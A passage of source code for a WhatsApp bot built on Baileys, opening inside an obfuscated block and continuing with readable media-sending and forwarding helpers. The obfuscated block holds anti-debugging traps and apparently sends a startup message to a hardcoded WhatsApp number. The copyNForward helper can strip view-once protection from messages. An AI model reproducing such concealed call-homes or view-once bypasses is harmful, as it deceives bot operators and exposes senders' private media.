_0x4c2e53=['➥\x20*ʙʀ','_\x0a\x0a🧚➥','init','_\x20\x0a\x0a🧚','WNlAv','2EGlcFj','strin','\x20\x0a\x0a🧚➥','count','CcZGq','ᴛꜰʀᴏʀ','ᴇɴ-ᴍᴅ','OFXxs','a-zA-','nds','comma','OmdeL','\x20*ʙɪᴛ','qRiBs','➥\x20*ᴅᴇ','_0.0.','toStr','Rqfsm','YPE','ᴇ*\x20═\x20','NUAlh','cmvzT','\x20\x20_94','sonli','PIdGF','cnSDk','39064wLxMDP','𝗦𝗛𝗘𝗡𝗨','\x5c(\x20*\x5c','┉▣\x0a\x0a🧚','n\x20(fu','x_\x0a\x0a🧚','683679ILhYkF','ᴛʜᴜꜱʜ','IZQxH','NJJqX','const','ʜᴇᴍᴇ*','e)\x20{}','8ZPhPdn','203998eKusmz','ʀᴇᴛᴇᴅ','BRANC','KNgVC','\x22retu','wtYcS','ᴀɴ*\x0a\x0a','zA-Z_','eZhbC','9956_','𝗖𝗧𝗘𝗗\x20','funct','Z_$][','*\x20═\x20\x20','text','14680vVSQVO','\x20ᴏɴʟɪ','hatsa','ᴍᴍᴀɴᴅ','ʀꜱɪᴏɴ','ꜱʙᴀʟ\x20','apply','retur','ing',')+)+)','nctio','ctor(','10bWJDDo','actio','🔰\x20*ʀᴇ','ᴀɴᴄʜ*','OXclG','1948632ynulsF','─────','chain','ɴ*\x20═\x20','132spAprj','6@s.w','*\x0a\x0a','\x20𝗤𝗨𝗘𝗘','zETlX','\x20\x20_','VWfgg','\x0a\x0a\x20▣┉','\x20*ᴏᴡɴ','2619iazdFy','🧚➥\x20*ᴛ','terva','test','AXxiQ','✅\x0a\x0a🧚➥','log','while','call','ion\x20*','(((.+','WORKT','input','cTadN','_Linu','94710','zUpjl','\x20(tru','yrfpQ','ᴇʀ*\x20═','state','rn\x20th','lepm','VzwOL','10995','debu','ᴜ-Qᴜᴇ','qtgiu','is\x22)(','Dmlay','alway','setIn','71010','1_\x20\x0a\x0a','\x20ʙʏ\x20ᴄ','LANG','\x20ᴀʟʟ*','pp.ne','*(?:[','1505240Pbhoau','*ꜱʜᴇɴ','utzah','ObSyw','fzWXy','nstru','lengt','ʏʙᴇʀ\x20','n()\x20','/2023','\x20ᴠ1*\x0a','sendM','➥\x20*ᴄᴏ','ᴅᴀᴛᴇ\x20','3768996xayZbB','𝗖𝗢𝗡𝗔𝗘','searc','gger','{}.co','0-9a-','Sfsqx','\x5c+\x5c+\x20','ᴀʟᴇꜱ\x20','\x20*ᴍᴏᴅ','ructo','\x0a👩‍💻\x20*ᴄ','disab','essag','𝗡\x20𝗠𝗗\x20','➥\x20*ᴠᴇ','_\x0a\x0a🧚\x20','eQSqa','22/10','xHbrL','\x20*ᴘʟᴀ','Objec','\x20═\x20\x20_','$]*)','ᴘᴍ*\x20═'];_0x1c9c=function(){return _0x4c2e53;};return _0x1c9c();}console[_0x300749(0x50e,0x4ea,0x4e9,0x4ed,0x4b0)](Msg);const _0x43c26a={};function _0x5246cb(_0x223a1e,_0x4e29b2,_0x1b987c,_0x4a7ddc,_0x43ae3f){return _0x60c2(_0x223a1e- -0xcb,_0x43ae3f);}_0x43c26a[_0x932759(0x107,0xf8,0xa0,0xe7,0xa4)]=Msg;function _0x300749(_0xd3dba9,_0x153714,_0x2ec71f,_0x3dbdbb,_0x293031){return _0x60c2(_0x153714-0x39a,_0x3dbdbb);}function _0x22d578(_0x329aba,_0x3a99cf,_0x5646c2,_0xf01639,_0x1e1f4e){return _0x60c2(_0x3a99cf-0x171,_0x5646c2);}Void[_0x22d578(0x20d,0x245,0x277,0x26e,0x277)+_0x22d578(0x22f,0x255,0x25f,0x21d,0x27d)+'e'](_0x22d578(0x2b9,0x2ca,0x28b,0x2cf,0x310)+_0x5246cb(0x97,0x87,0xa5,0x46,0x9d)+_0x5246cb(0x77,0xad,0x99,0x25,0x8b)+_0x35cf7b(0x2c9,0x2d1,0x2b2,0x303,0x2ce)+_0x300749(0x446,0x461,0x429,0x483,0x4a1)+'t',_0x43c26a),(function(){function _0x2f3a29(_0x4f80cd,_0x45a99e,_0x5e30c3,_0x247a3b,_0x46ac06){return _0x35cf7b(_0x4f80cd-0x10a,_0x46ac06- -0x389,_0x45a99e,_0x247a3b-0x174,_0x46ac06-0x1e5);}function _0x44066e(_0x3ce6a3,_0x22b8fb,_0x54eb89,_0x55dd1e,_0x5e0f52){return _0x22d578(_0x3ce6a3-0x1e8,_0x5e0f52- -0x110,_0x22b8fb,_0x55dd1e-0x104,_0x5e0f52-0xc3);}const _0x57e649=function(){function _0x33e2d8(_0x177d36,_0x3aba10,_0x2a6a40,_0x4cabd2,_0x330fd2){return _0x60c2(_0x3aba10- -0x285,_0x4cabd2);}function _0x2caa79(_0x222ada,_0x5b4c58,_0x5222e8,_0x66be26,_0x53ad2c){return _0x60c2(_0x5222e8- -0x164,_0x66be26);}function _0x456ce7(_0x546155,_0x27861d,_0x468f23,_0x484b85,_0x4da1bd){return _0x60c2(_0x546155- -0xff,_0x27861d);}function _0x2467ac(_0x150ea4,_0x379967,_0x186099,_0x35e0a9,_0x2a47e3){return _0x60c2(_0x186099- -0x3db,_0x2a47e3);}function _0x389bc7(_0x3871c7,_0x27b693,_0x29089f,_0x50367e,_0x49aa77){return _0x60c2(_0x27b693-0x274,_0x49aa77);}if(_0x389bc7(0x2f9,0x33f,0x340,0x385,0x32f)!==_0x33e2d8(-0x196,-0x1ba,-0x1b7,-0x17f,-0x1d0)){const _0x585632=function(){function _0x355d10(_0x5f463d,_0x4cfec9,_0x2feaf9,_0x1344f8,_0x5b0e3e){return _0x389bc7(_0x5f463d-0x6b,_0x5b0e3e- -0x3b5,_0x2feaf9-0x130,_0x1344f8-0x124,_0x2feaf9);}let _0x122739;function _0x4004bb(_0x1543c5,_0xb62f87,_0x750291,_0x3fe08f,_0x429f9a){return _0x389bc7(_0x1543c5-0x4a,_0x3fe08f- -0x2eb,_0x750291-0x5a,_0x3fe08f-0x132,_0xb62f87);}try{_0x122739=_0x24929d(_0x355d10(0x36,0x27,-0x55,-0x36,-0xe)+_0x355d10(-0x19,-0x1,-0x48,-0x37,-0x2e)+_0x19dbd7(-0x269,-0x252,-0x272,-0x25b,-0x2a3)+_0xa9fd02(0x33d,0x2da,0x309,0x353,0x34d)+(_0x4004bb(0x2a,0x70,0xa1,0x64,0x87)+_0x4004bb(0x2c,0x99,0x66,0x57,0x5b)+_0x355d10(-0x2b,-0x34,-0x26,0xa,-0xa)+_0x19dbd7(-0x263,-0x234,-0x287,-0x26f,-0x244)+_0x4004bb(0xb4,0x130,0xb2,0xe8,0x104)+_0x355d10(-0x80,-0xc4,-0x4e,-0x75,-0x83)+'\x20)')+');')();}catch(_0x406279){_0x122739=_0x6ccb41;}function _0xef15a8(_0x52d492,_0x428e57,_0x48626e,_0x22138f,_0x19e0ea){return _0x33e2d8(_0x52d492-0x188,_0x428e57- -0x42,_0x48626e-0x27,_0x52d492,_0x19e0ea-0x96);}function _0xa9fd02(_0x364462,_0x29f67e,_0x4061db,_0x4c5174,_0x397bb1){return _0x33e2d8(_0x364462-0x49,_0x4061db-0x4bd,_0x4061db-0x114,_0x397bb1,_0x397bb1-0x12);}function _0x19dbd7(_0x3f4500,_0x4a4d03,_0xe5b5d9,_0x4259d2,_0x4c62df){return _0x33e2d8(_0x3f4500-0x86,_0xe5b5d9- -0x123,_0xe5b5d9-0x1ee,_0x4c62df,_0x4c62df-0x1c1);}return _0x122739;},_0x21592c=_0x585632();_0x21592c[_0x33e2d8(-0x1d3,-0x1c4,-0x1d0,-0x192,-0x1ce)+_0x33e2d8(-0xfa,-0x139,-0x105,-0x165,-0x12c)+'l'](_0x14a6f2,0xfc5+-0x99b+-0x2*-0x4bb);}else{let _0x6fef6;try{_0x2caa79(0x3c,0x1e,-0x3,-0x2d,0x4e)!==_0x33e2d8(-0x13d,-0x12b,-0x146,-0x12c,-0x161)?_0x6fef6=Function(_0x456ce7(0x34,0x24,0x2c,-0xa,0x33)+_0x2467ac(-0x2f1,-0x2a0,-0x2c8,-0x2e2,-0x2cf)+_0x2caa79(0x19,-0x37,-0x2e,-0x5c,0x1b)+_0x33e2d8(-0x173,-0x1b4,-0x19c,-0x171,-0x1ed)+(_0x389bc7(0x37f,0x34f,0x327,0x337,0x376)+_0x2467ac(-0x2e3,-0x343,-0x30d,-0x2d7,-0x34d)+_0x2caa79(0x1c,-0x7b,-0x2d,-0x54,0x21)+_0x2467ac(-0x2ac,-0x2f8,-0x2ba,-0x2e5,-0x2a5)+_0x389bc7(0x402,0x3d3,0x421,0x3b4,0x385)+_0x33e2d8(-0x1f5,-0x1c7,-0x17e,-0x18b,-0x1c4)+'\x20)')+');')():_0x23603e();}catch(_0x21aa9b){if(_0x2caa79(-0xe1,-0xe2,-0xa5,-0xb0,-0x5f)!==_0x2467ac(-0x2d9,-0x340,-0x31c,-0x2e7,-0x33b)){const _0x4466ee=_0x13380f?function(){function _0x3d5214(_0x1d2502,_0x1ff371,_0x1d0894,_0x53d2a3,_0x552eea){return _0x33e2d8(_0x1d2502-0x10b,_0x53d2a3-0x388,_0x1d0894-0x1d3,_0x1ff371,_0x552eea-0x157);}if(_0x72d927){const _0x374bd7=_0x43379a[_0x3d5214(0x21d,0x24d,0x219,0x235,0x1e6)](_0x570e57,arguments);return _0xd21fb9=null,_0x374bd7;}}:function(){};return _0x4bf1f0=![],_0x4466ee;}else _0x6fef6=window;}return _0x6fef6;}},_0x413cd2=_0x57e649();_0x413cd2[_0x2f3a29(-0x14a,-0xe4,-0xd3,-0x172,-0x125)+_0x44066e(0x170,0x1c6,0x1d1,0x1b6,0x1ad)+'l'](_0x5e86f4,0xc57*0x1+0x1*0x2563+-0x3ca*0x9);}());function _0x35cf7b(_0x9390b,_0x434c80,_0x58ccb0,_0x5a2e9e,_0x346e72){return _0x60c2(_0x434c80-0x1a3,_0x58ccb0);}function _0x5e86f4(_0x491dad){function _0xe01876(_0x5b66b1,_0x404b73,_0x58aed1,_0x1f6c49,_0x34a6a1){return _0x22d578(_0x5b66b1-0x32,_0x5b66b1-0x1b9,_0x58aed1,_0x1f6c49-0xff,_0x34a6a1-0x19f);}function _0x59fab4(_0x5c90f4,_0x8e2c1e,_0x389fc2,_0x394162,_0x5c8422){return _0x35cf7b(_0x5c90f4-0x83,_0x5c90f4-0x107,_0x389fc2,_0x394162-0x10f,_0x5c8422-0x1c);}function _0x120ac3(_0x17a933){function _0x4d6ef9(_0x412337,_0x447c68,_0x386872,_0x2cc80c,_0x18da39){return _0x60c2(_0x447c68- -0x160,_0x18da39);}function _0x2c44ef(_0x5a15ae,_0x16cc46,_0x48cab1,_0x23f400,_0x1769d8){return _0x60c2(_0x16cc46- -0x1de,_0x23f400);}function _0x463a4c(_0x56ce00,_0xa4e334,_0x500097,_0x3a0f9d,_0x1bf5b5){return _0x60c2(_0xa4e334-0x10c,_0x3a0f9d);}function _0xd48fa2(_0x30a38c,_0x2ea3ee,_0x48260c,_0x3b26c0,_0x43d023){return _0x60c2(_0x48260c- -0x63,_0x30a38c);}function _0x12613f(_0x714109,_0x586d19,_0x40958e,_0x17dc9e,_0x127a51){return _0x60c2(_0x40958e- -0x2e8,_0x17dc9e);}if(_0x12613f(-0x1ee,-0x22e,-0x22b,-0x215,-0x21c)===_0x12613f(-0x21e,-0x21b,-0x22b,-0x1fe,-0x201)){if(typeof _0x17a933===_0x4d6ef9(-0x86,-0x6a,-0x26,-0x3d,-0xa0)+'g'){if(_0x12613f(-0x1fd,-0x1d9,-0x1e8,-0x22e,-0x210)!==_0x12613f(-0x1b3,-0x20a,-0x1e8,-0x1a2,-0x1d1)){let _0x3ba189;try{_0x3ba189=_0x2e9e74(_0x2c44ef(-0x9b,-0xab,-0xe4,-0x5f,-0xdf)+_0x4d6ef9(-0x1e,-0x4d,-0x7a,-0x28,-0x92)+_0x2c44ef(-0xa8,-0xa8,-0x89,-0x6e,-0xbd)+_0xd48fa2(0xbc,0x40,0x6e,0x1e,0x97)+(_0x4d6ef9(-0x33,-0x85,-0x69,-0xa0,-0xc8)+_0x4d6ef9(-0xae,-0x92,-0xca,-0x52,-0x70)+_0x2c44ef(-0xd1,-0xa7,-0xd7,-0xa3,-0xe2)+_0xd48fa2(0xb7,0xfa,0xbe,0x9c,0x71)+_0x4d6ef9(0x33,-0x1,-0x3,0x41,0x49)+_0x2c44ef(-0xe4,-0x120,-0xff,-0x113,-0x14c)+'\x20)')+');')();}catch(_0x3f426b){_0x3ba189=_0x203ddb;}return _0x3ba189;}else return function(_0x50c5b3){}[_0xd48fa2(0xef,0xfc,0xb6,0xf3,0xcb)+_0xd48fa2(0x37,0xa6,0x7e,0x44,0x2e)+'r'](_0x12613f(-0x1ae,-0x1dd,-0x197,-0x1d0,-0x1da)+_0xd48fa2(0xd8,0x14c,0xf8,0xec,0xf8)+_0x12613f(-0x207,-0x1cf,-0x1cd,-0x1a0,-0x1da))[_0x12613f(-0x1ef,-0x184,-0x1b6,-0x1c8,-0x170)](_0x4d6ef9(-0x74,-0x68,-0x71,-0xa3,-0x90)+'er');}else{if(_0x2c44ef(-0xf2,-0xf4,-0xf4,-0x125,-0xf9)!==_0xd48fa2(0x11f,0xca,0xf4,0xe5,0xbd)){if((''+_0x17a933/_0x17a933)[_0x2c44ef(-0x157,-0x10f,-0x115,-0xec,-0x11b)+'h']!==0x13*0x185+0xe3*0x2a+-0x421c*0x1||_0x17a933%(-0x2*-0xf10+-0x6*-0x65+-0x206a)===0x1acc*0x1+-0x1002+0x2*-0x565){if(_0x12613f(-0x1d3,-0x1c1,-0x1d1,-0x19e,-0x1b5)!==_0xd48fa2(0xbf,0xec,0xbf,0xb1,0xab))(function(){function _0x4a19f1(_0x5b5843,_0x26911b,_0x8fc304,_0x59fb4f,_0x183337){return _0x2c44ef(_0x5b5843-0x5f,_0x26911b-0x428,_0x8fc304-0xe2,_0x59fb4f,_0x183337-0x62);}function _0x2e0b8f(_0x1fbce2,_0x46b2a6,_0x4e403a,_0x3d52bb,_0x52e0dd){return _0x12613f(_0x1fbce2-0x113,_0x46b2a6-0x55,_0x3d52bb-0x15a,_0x52e0dd,_0x52e0dd-0x1bd);}if(_0x2e0b8f(-0xb7,-0xb6,-0x7d,-0xa6,-0x88)!==_0x4a19f1(0x2ec,0x332,0x2ef,0x2e1,0x369))_0x5b1589=_0x5a3d9b;else return!![];}[_0x4d6ef9(-0xe,-0x47,-0x80,-0x8d,0x0)+_0x463a4c(0x201,0x1ed,0x1a1,0x1f5,0x1e1)+'r'](_0x12613f(-0x1a8,-0x186,-0x185,-0x170,-0x13c)+_0x2c44ef(-0x150,-0x104,-0x10e,-0xe0,-0xd1))[_0x12613f(-0x1e5,-0x14c,-0x196,-0x15d,-0x18e)](_0xd48fa2(0xe9,0xaa,0xd6,0xef,0x8b)+'n'));else{if(_0x355849){const _0xe86d74=_0x59ba33[_0x12613f(-0x173,-0x1e7,-0x1b6,-0x1a4,-0x180)](_0x3b0776,arguments);return _0x1a6b5b=null,_0xe86d74;}}}else{if(_0x4d6ef9(-0x7,-0x4,0x13,-0x53,0x19)===_0x12613f(-0x1ba,-0x147,-0x18c,-0x14f,-0x140))(function(){function _0x109610(_0x475ede,_0x97fb8f,_0x300d25,_0x23b865,_0x4e4087){return _0x463a4c(_0x475ede-0x19,_0x4e4087-0x8e,_0x300d25-0x27,_0x300d25,_0x4e4087-0x7d);}function _0x58a384(_0x2a1e82,_0x520bf,_0x1a95ad,_0x41b913,_0x59a0fd){return _0x12613f(_0x2a1e82-0xf5,_0x520bf-0x121,_0x41b913-0x570,_0x520bf,_0x59a0fd-0x12);}if(_0x58a384(0x344,0x33e,0x36b,0x391,0x376)===_0x58a384(0x34c,0x362,0x346,0x391,0x38c))return![];else{const _0x12c2c5=_0x4f79d1?function(){function _0x179de6(_0x26e941,_0x45fe50,_0x301aa8,_0x279480,_0xa1e1c3){return _0x109610(_0x26e941-0x1e4,_0x45fe50-0x51,_0xa1e1c3,_0x279480-0xbf,_0x26e941-0x54);}if(_0x34798c){const _0x5440da=_0x1a0dbf[_0x179de6(0x320,0x333,0x30c,0x346,0x2f4)](_0x4515b2,arguments);return _0x5862ad=null,_0x5440da;}}:function(){};return _0x1d7d54=![],_0x12c2c5;}}[_0xd48fa2(0x108,0x95,0xb6,0xb8,0x75)+_0x4d6ef9(-0x4e,-0x7f,-0x73,-0x53,-0xc1)+'r'](_0x12613f(-0x14c,-0x177,-0x185,-0x1d3,-0x162)+_0x12613f(-0x1ba,-0x221,-0x20e,-0x1e5,-0x1ed))[_0x2c44ef(-0xd3,-0xac,-0x90,-0x80,-0xd6)](_0x2c44ef(-0xc8,-0x80,-0x6e,-0x50,-0x36)+_0x12613f(-0x242,-0x1c0,-0x1fc,-0x229,-0x207)+'t'));else return!![];}}else{const _0x7ec093=_0x5ad4a0[_0x4d6ef9(0xc,-0x2e,-0x4,-0x6c,0x24)](_0x8bd8aa,arguments);return _0x3a4c91=null,_0x7ec093;}}_0x120ac3(++_0x17a933);}else{if(_0xb599fc)return _0x5c1bbb;else _0x52ae76(0x1a0a+0xaf3*-0x2+-0x424);}}function _0x44651f(_0x204d2d,_0xe2ba5e,_0x69e476,_0x4daa51,_0x1fc79a){return _0x300749(_0x204d2d-0xf,_0x1fc79a- -0x578,_0x69e476-0x105,_0x204d2d,_0x1fc79a-0x19b);}function _0x5e5fbf(_0x831218,_0x1e0610,_0xa39216,_0x37e16f,_0x505bfd){return _0x22d578(_0x831218-0x189,_0x1e0610-0x17b,_0x37e16f,_0x37e16f-0x185,_0x505bfd-0x97);}function _0x5d2cbf(_0x24d570,_0x1c370d,_0x1a649f,_0x3d3395,_0x56ad33){return _0x35cf7b(_0x24d570-0x178,_0x3d3395-0xb5,_0x24d570,_0x3d3395-0x1bd,_0x56ad33-0x1bd);}try{if(_0x5e5fbf(0x3fa,0x3fa,0x3c4,0x3f6,0x41e)===_0xe01876(0x442,0x429,0x42e,0x464,0x47d))return _0x4837af;else{if(_0x491dad){if(_0x5d2cbf(0x38b,0x33a,0x35f,0x365,0x37e)===_0x44651f(-0xcb,-0xbd,-0x66,-0x75,-0x97)){const _0x492575=new _0xaaef21(_0x44651f(-0x7e,-0x103,-0xb2,-0x62,-0xb6)+_0x5d2cbf(0x3a6,0x3b0,0x37d,0x3ab,0x383)+_0x59fab4(0x3bb,0x3c3,0x3dd,0x3d7,0x381)+')'),_0x49fb43=new _0x1add4f(_0x5e5fbf(0x386,0x3ca,0x404,0x3d8,0x377)+_0x44651f(-0x107,-0x136,-0xde,-0x123,-0x116)+_0x5d2cbf(0x30f,0x30d,0x38a,0x355,0x3a8)+_0xe01876(0x453,0x437,0x425,0x437,0x499)+_0x5e5fbf(0x381,0x3c8,0x39b,0x3cb,0x3e5)+_0x44651f(-0xaa,-0x96,-0xb3,-0xa9,-0xba)+_0x5e5fbf(0x3a2,0x3da,0x421,0x39f,0x41f),'i'),_0x3d66fa=_0x4e4757(_0x5d2cbf(0x324,0x352,0x34a,0x34a,0x352));!_0x492575[_0xe01876(0x477,0x42f,0x4bf,0x48e,0x452)](_0x3d66fa+_0x59fab4(0x3e9,0x3de,0x3a6,0x3db,0x43d))||!_0x49fb43[_0x44651f(-0x63,-0x65,-0x92,-0x99,-0x91)](_0x3d66fa+_0x5e5fbf(0x40c,0x442,0x420,0x476,0x453))?_0x3d66fa('0'):_0x17be9c();}else return _0x120ac3;}else _0x5e5fbf(0x391,0x3c9,0x37c,0x393,0x3db)===_0xe01876(0x407,0x449,0x459,0x411,0x459)?_0x120ac3(-0x20d4+-0x9a0+0x344*0xd):_0x4c0408=_0x25fd4e(_0x5e5fbf(0x3e1,0x41f,0x43a,0x456,0x3de)+_0x5e5fbf(0x3c5,0x3ff,0x3f7,0x413,0x3c9)+_0x5e5fbf(0x417,0x422,0x435,0x3fd,0x3fc)+_0xe01876(0x3fb,0x3de,0x3dc,0x3ee,0x410)+(_0x59fab4(0x385,0x3cc,0x3d2,0x357,0x3bc)+_0x44651f(-0xd0,-0xd4,-0x11f,-0x133,-0x110)+_0x44651f(-0x73,-0x89,-0xbe,-0xab,-0xa7)+_0x59fab4(0x3cb,0x406,0x417,0x3ab,0x3f6)+_0x59fab4(0x409,0x3e5,0x44e,0x3de,0x3bc)+_0x5e5fbf(0x3aa,0x3aa,0x35c,0x3ec,0x3f4)+'\x20)')+');')();}}catch(_0x4b11f4){}}
                }
               if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401 ) {
                    console.log('Connection closed with bot. Please put New Session ID again.');
                    await sleep(5000);
                    syncdb().catch(err => console.log(err));
                } 
            })
        Void.ev.on('creds.update', saveCreds)
            //================================================[Some Params]===============================================================================
            /** Send Button 5 Image
             *
             * @param {*} jid
             * @param {*} text
             * @param {*} footer
             * @param {*} image
             * @param [*] button
             * @param {*} options
             * @returns
             */
            //========================================================================================================================================
        Void.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
            let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: Void.waUploadToServer })
            var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
                templateMessage: {
                    hydratedTemplate: {
                        imageMessage: message.imageMessage,
                        "hydratedContentText": text,
                        "hydratedFooterText": footer,
                        "hydratedButtons": but
                    }
                }
            }), options)
            Void.relayMessage(jid, template.message, { messageId: template.key.id })
        }

        /**
         *
         * @param {*} jid
         * @param {*} buttons
         * @param {*} caption
         * @param {*} footer
         * @param {*} quoted
         * @param {*} options
         */
        //========================================================================================================================================
        Void.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
            let buttonMessage = {
                    text,
                    footer,
                    buttons,
                    headerType: 2,
                    ...options
                }
                //========================================================================================================================================
            Void.sendMessage(jid, buttonMessage, { quoted, ...options })
        }

        /**
         *
         * @param {*} jid
         * @param {*} text
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Void.sendText = (jid, text, quoted = '', options) => Void.sendMessage(jid, { text: text, ...options }, { quoted })

        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} caption
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Void.sendImage = async(jid, path, caption = '', quoted = '', options) => {
            let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
            return await Void.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
        }

        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} caption
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Void.sendTextWithMentions = async(jid, text, quoted, options = {}) => Void.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
    Void.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await Void.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
Void.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await Void.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
       
            //========================================================================================================================================
        Void.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
                let types = await Void.getFile(path, true)
                let { mime, ext, res, data, filename } = types
                if (res && res.status !== 200 || file.length <= 65536) {
                    try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
                }
                let type = '',
                    mimetype = mime,
                    pathFile = filename
                if (options.asDocument) type = 'document'
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif')
                    let media = { mimetype: mime, data }
                    pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
                    await fs.promises.unlink(filename)
                    type = 'sticker'
                    mimetype = 'image/webp'
                } else if (/image/.test(mime)) type = 'image'
                else if (/video/.test(mime)) type = 'video'
                else if (/audio/.test(mime)) type = 'audio'
                else type = 'document'
                await Void.sendMessage(jid, {
                    [type]: { url: pathFile },
                    caption,
                    mimetype,
                    fileName,
                    ...options
                }, { quoted, ...options })
                return fs.promises.unlink(pathFile)
            }
            /**
             *
             * @param {*} message
             * @param {*} filename
             * @param {*} attachExtension
             * @returns
             */
            //========================================================================================================================================
        Void.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message
                let mime = (message.msg || message).mimetype || ''
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
                const stream = await downloadContentFromMessage(quoted, messageType)
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                let type = await FileType.fromBuffer(buffer)
                trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
                    // save to file
                await fs.writeFileSync(trueFileName, buffer)
                return trueFileName
            }
            //========================================================================================================================================
        Void.downloadMediaMessage = async(message) => {
            let mime = (message.msg || message).mimetype || ''
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
            const stream = await downloadContentFromMessage(message, messageType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }

            return buffer
        }

        /**
         *
         * @param {*} jid
         * @param {*} message
         * @param {*} forceForward
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Void.copyNForward = async(jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await Void.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
        }
        Void.sendFileUrl = async(jid, url, caption, quoted, options = {}) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return Void.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
            }
            let type = mime.split("/")[0] + "Message"
            if (mime === "application/pdf") {
                return Void.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "image") {
                return Void.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "video") {
                return Void.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "audio") {
                return Void.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
            }
        }

        //========================================================================================================================================
        Void.cMod = (jid, copy, text = '', sender = Void.user.id, options = {}) => {
            //let copy = message.toJSON()
            let mtype = Object.keys(copy.message)[0]
            let isEphemeral = mtype === 'ephemeralMessage'
            if (isEphemeral) {
                mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
            }
            let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
            let content = msg[mtype]
            if (typeof content === 'string') msg[mtype] = text || content
            else if (content.caption) content.caption = text || content.caption
            else if (content.text) content.text = text || content.text
            if (typeof content !== 'string') msg[mtype] = {
                ...content,
                ...options
            }
            if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
            else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
            if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
            else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
            copy.key.remoteJid = jid
            copy.key.fromMe = sender === Void.user.id

            return proto.WebMessageInfo.fromObject(copy)
        }


        /**
         *
         * @param {*} path
         * @returns
         */
        //========================================================================================================================================
        Void.getFile = async(PATH, save) => {
                let res
                let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
